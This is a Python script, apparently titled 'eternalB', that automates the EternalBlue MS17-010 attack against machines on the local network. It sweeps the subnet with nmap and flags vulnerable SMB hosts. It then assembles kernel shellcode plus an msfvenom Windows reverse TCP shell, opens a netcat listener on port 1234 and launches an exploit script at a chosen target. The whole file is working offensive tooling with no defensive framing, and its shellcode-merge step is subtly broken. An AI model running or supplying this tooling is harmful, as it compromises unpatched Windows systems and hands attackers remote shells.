import pyfiglet as pf
import subprocess as sp
import netifaces as ni


def installRequiements():
	sp.call(["sudo", "pip", "install", "-r", "requirements.txt"])


def clearAndTitle():
	sp.call(["clear"])
	print(pf.figlet_format("eternalB", font="larry3d"))


def scan1():
    #variabili
	s = "Nmap scan report for "
	ipList = list()
	netIp = getIP() + "/24"

	#subprocess
	p = sp.Popen(["sudo", "nmap", "-sP", netIp], stdout=sp.PIPE).stdout
	l = p.read().splitlines()

	#decode from byte to string
	l = [x.decode("utf-8") for x in l]

	#rimuovi primo e ultimo elemento
	del l[0]
	del l[-1]

	#ciclo stampa ip
	for i, x in enumerate(l):
		if s in x:
			l[i] = x.replace(s,'')
			#print(l[i])
			ipList.append(l[i])
	return ipList


def scan2(lst):
	#variabili
	vulnList = list()
	
	for ip in lst:
		if checkVuln(ip):
			vulnList.append((ip))
	return vulnList


def checkVuln(ip):
	#subprocess
	p = sp.Popen(["sudo","nmap","-p", "445", "--script", "smb-vuln-ms17-010", ip], stdout=sp.PIPE).stdout
	t = p.read().splitlines()
	
	#decode from byte to string
	t = [x.decode("utf-8") for x in t]
	
	#ciclo check ip
	for i in t:
		if "VULNERABLE" in i:
			return True
	return False


def chooseTarget(vulnList):
	for i in vulnList:
		print("[" + str(vulnList.index(i)) + "]" + " " + i)
	return vulnList[int(input("Choose the target: "))]
	

def execVuln(target):
	shellPrep()
	os = getOS(target)
	script = ""
	shellcode = ""
	clearAndTitle()
	
	if os in ["Microsoft Windows 2012", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit10.py"])
		script = "eternalblue_exploit10.py"
	elif os in ["Microsoft Windows 7", "Microsoft Windows 2008"]:
		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit7.py"])
		script = "eternalblue_exploit7.py"
	else:
		print("Error, os not in list")
		exit()
	
	clearAndTitle()
	print("Please insert the target os architecture? " + os + " [64/32]bit")
	y = input()
	if y in ["64", "64bit", "64Bit", "64BIT", "64 bit", "64 Bit", "64 BIT", ""]:
		shellcode = "shellcode/sc_x64.bin"
	elif y in ["32", "32bit", "32Bit", "32BIT", "32 bit", "32 Bit", "32 BIT"]:
		shellcode = "shellcode/sc_x86.bin"
	else:
		print("Please insert a valid option")
		exit()
	
	clearAndTitle()
	print("Everything ready, would you like to execute the attack? [Y/n]")
	y = input()
	if y not in ["y", "Y", ""]:
		print("Goodbye!")
		exit()
	
	clearAndTitle()
	#sp.Popen(["xfce4-terminal", "-x", "nc", "-nvlp", "1234"])
	sp.Popen(["gnome-terminal", "--", "nc", "-nvlp", "1234"])
	sp.call(["sleep", "2"])
	sp.call(["python", script, target, shellcode])



def getIP():
	try:
		ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
	except:
		ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
	return ip


def getOS(ip):
	p = sp.Popen(["sudo","nmap","-O", ip], stdout=sp.PIPE).stdout
	t = p.read().splitlines()
	t = [x.decode("utf-8") for x in t]
	res = ""
	for i in t:
		if "Running:" in i:
			res = i[9:]
			return res


def shellPrep():
	myIp="LHOST=" + getIP()
	portx64="LPORT=1234"
	portx86="LPORT=1234"

	#print("Compiling x64 kernel shellcode...")
	sp.run(["nasm", "-f", "bin", "shellcode/eternalblue_kshellcode_x64.asm", "-o", "shellcode/sc_x64_kernel.bin"])
	#print("Compiling x86 kernel shellcode...")
	sp.run(["nasm", "-f", "bin", "shellcode/eternalblue_kshellcode_x86.asm", "-o", "shellcode/sc_x86_kernel.bin"])

	#print("Generating x64 cmd shell...")
	sp.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x64_msf.bin", "EXITFUNC=thread", myIp, portx64])
	#print("Generating x86 cmd shell...")
	sp.run(["msfvenom", "-p", "windows/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x86_msf.bin", "EXITFUNC=thread", myIp, portx86])

	#print("Merging shellcode...")
	sp.run(["cat", "shellcode/sc_x64_kernel.bin", "shellcode/sc_x64_msf.bin", ">", "shellcode/sc_x64.bin"])
	sp.run(["cat", "shellcode/sc_x86_kernel.bin", "shellcode/sc_x86_msf.bin", ">", "shellcode/sc_x86.bin"])
	sp.run(["python3", "shellcode/eternalblue_sc_merge.py", "shellcode/sc_x86.bin", "shellcode/sc_x64.bin", "shellcode/sc_all.bin"])


#                                                                              #
# ---------------------------------------------------------------------------- #
#                                                                              #

if __name__ == "__main__":
	clearAndTitle()
	installRequiements()
	clearAndTitle()
	print("Would you like to execute the first scan? [Y/n]")
	y = input()
	if y not in ["y", "Y", ""]:
		print("Goodbye!")
		exit()
	clearAndTitle()
	ipList = scan1()
	iplist = list()
	for i in ipList:
		print("- " + i)
	print('\n')
	for i in ipList:
		if "(" in i:
			iplist.append(i[i.find("(")+1:-1])
		else:
			iplist.append(i)
	print("Would you like to execute the vulnerability scan? [Y/n]")
	y = input()
	if y not in ["y", "Y", ""]:
		print("Goodbye!")
		exit()
	clearAndTitle()
	vulnList = scan2(iplist)
	if len(vulnList) == 0:
		print("Unfortunately there are 0 IPs vulnerable")
		exit()
	target = chooseTarget(vulnList)
	execVuln(target)
	
